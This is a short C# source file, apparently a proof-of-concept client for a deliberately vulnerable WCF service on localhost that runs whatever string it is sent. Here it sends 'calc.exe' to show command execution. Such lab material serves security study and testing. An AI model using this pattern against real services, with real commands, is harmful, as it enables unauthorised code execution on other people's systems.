using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;

namespace VulnServiceClient {

    [ServiceContract]
    public interface IVulnService {

        [OperationContract]
        void RunMe(string str);
    }

    public class VulnServiceClient : IVulnService {


        public static void Main() {
            ChannelFactory<IVulnService> channelFactory = new ChannelFactory<IVulnService>(
            new NetTcpBinding(),
            "net.tcp://localhost:81/VulnService/RunMe");
            IVulnService client = channelFactory.CreateChannel();
            client.RunMe("calc.exe");
        }

        public void RunMe(string str) {
            throw new NotImplementedException();
        }
    }
}